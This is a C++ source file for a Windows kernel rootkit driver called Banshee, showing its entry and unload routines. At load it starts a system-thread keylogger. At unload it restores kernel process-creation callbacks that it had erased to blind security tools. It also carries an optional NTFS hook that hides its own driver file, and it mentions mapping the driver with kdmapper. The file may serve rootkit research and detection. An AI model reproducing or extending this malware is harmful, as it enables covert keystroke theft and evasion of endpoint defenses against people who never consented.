#include <ntifs.h>
#include <wdf.h>

#include "DriverMeta.hpp"
#include "Globals.hpp"
#include "Commands.hpp"
#include "FileUtils.hpp"
#include "Keylogger.hpp"

// --------------------------------------------------------------------------------------------------------

// Features

// Deny file system  access to the banshee.sys file by hooking NTFS
#define DENY_DRIVER_FILE_ACCESS FALSE

// --------------------------------------------------------------------------------------------------------

HANDLE hKeyloggerThread;

/**
 * Called on unloading the driver.
 *
 * @param DriverObject Pointer to the DriverObject.
 * @return NTSTATUS status code.
 */
NTSTATUS
BeUnload(PDRIVER_OBJECT DriverObject)
{
    // TODO: call this from the client deliberately

    LOG_MSG("Unload Called \r\n");

    BeGlobals::shutdown = true;

    // Wait for keylogger to stop running TODO: proper signaling
    BeGlobals::logKeys = false;
    LARGE_INTEGER interval;
    interval.QuadPart = -1 * (LONGLONG)500 * 10000;
    KeDelayExecutionThread(KernelMode, FALSE, &interval);
    // Close thread handle
    ZwClose(hKeyloggerThread);

    // Restore kernel callbacks
    {
        {
            AutoLock<FastMutex> _lock(BeGlobals::callbackLock);

            LOG_MSG("Erased kernel callback amount: %i\n", BeGlobals::beCallbacksToRestore.length);
            while (BeGlobals::beCallbacksToRestore.length >= 0)
            {
                auto callbackToRestore = BeGlobals::beCallbacksToRestore.callbackToRestore[BeGlobals::beCallbacksToRestore.length];
                auto callbackAddr = BeGlobals::beCallbacksToRestore.addrOfCallbackFunction[BeGlobals::beCallbacksToRestore.length];
                auto callbackType = BeGlobals::beCallbacksToRestore.callbackType[BeGlobals::beCallbacksToRestore.length];

                if (callbackToRestore != NULL)
                {
                    LOG_MSG("Restoring kernel callback function -> callbackToRestore 0x%llx\n", callbackToRestore);
                    switch (callbackType)
                    {
                    case CreateProcessNotifyRoutine:
                        InterlockedExchange64((LONG64*)callbackAddr, callbackToRestore);
                        break;
                    default:
                        LOG_MSG("Invalid callback type\r\n");
                        return STATUS_INVALID_PARAMETER;
                        break;
                    }
                }
                BeGlobals::beCallbacksToRestore.length--;
            }
        }
    }

    // Unhook if NTFS was hooked
    if (BeGlobals::originalNTFS_IRP_MJ_CREATE_function != NULL)
    {
        if (BeUnhookNTFSFileCreate() == STATUS_SUCCESS)
        {
            LOG_MSG("Removed NTFS hook!\n");
        }
        else
        {
            LOG_MSG("Failed to remove NTFS hook!\n");
        }
    }

    // Delete shared memory
    BeCloseSharedMemory(BeGlobals::hSharedMemory, BeGlobals::pSharedMemory);

    LOG_MSG("Byebye!\n");
        
    return STATUS_SUCCESS;
}

/**
 * Called on closing the driver.
 *
 * @param DeviceObject Pointer to the DeviceObject.
 * @param Irp Pointer to the IO Request Packet (IRP)
 * @return NTSTATUS status code.
 */
NTSTATUS 
BeClose(PDEVICE_OBJECT pDeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(pDeviceObject);
    UNREFERENCED_PARAMETER(Irp);
    LOG_MSG("Close Called \r\n");
    return STATUS_SUCCESS;
}

/**
 * Called on driver creation.
 *
 * @param DeviceObject Pointer to the DeviceObject.
 * @param Irp Pointer to the IO Request Packet (IRP)
 * @return NTSTATUS status code.
 */
NTSTATUS 
BeCreate(PDEVICE_OBJECT pDeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(pDeviceObject);
    UNREFERENCED_PARAMETER(Irp);
    LOG_MSG("Create Called \r\n");
    return STATUS_SUCCESS;
}

/**
 * Banshees driver entrypoint.
 *
 * @param pDriverObject Pointer to the DriverObject.
 * @param pRegistryPath A pointer to a UNICODE_STRING structure that specifies the path to the driver's Parameters key in the registry.
 * @return NTSTATUS status code.
 */
NTSTATUS
BansheeEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{
    UNREFERENCED_PARAMETER(pRegistryPath);
    UNREFERENCED_PARAMETER(pDriverObject);

    NTSTATUS NtStatus = STATUS_SUCCESS;

    LOG_MSG("Init globals\r\n");
    NtStatus = BeGlobals::BeInitGlobals();
    if (!NT_SUCCESS(NtStatus))
    {
        return NtStatus;
    }

#if DENY_DRIVER_FILE_ACCESS
    NtStatus = BeHookNTFSFileCreate();
#endif

    // Start Keylogger Thread
    PKTHREAD ThreadObject;
    NtStatus = PsCreateSystemThread(&hKeyloggerThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, BeKeyLoggerFunction, NULL);
    if (NtStatus != 0)
    {
        return NtStatus;
    }

    return NtStatus;
}

/**
 * Driver entrypoint.
 *
 * @param pDriverObject Pointer to the DriverObject.
 * @param pRegistryPath A pointer to a UNICODE_STRING structure that specifies the path to the driver's Parameters key in the registry.
 * @return NTSTATUS status code.
 */
extern "C"
NTSTATUS
DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{
    LOG_MSG("DriverEntry Called \r\n");

    // If mapped, e.g. with kdmapper, those are empty.
    UNREFERENCED_PARAMETER(pDriverObject);
    UNREFERENCED_PARAMETER(pRegistryPath);

    return BansheeEntry(pDriverObject, pRegistryPath);
}
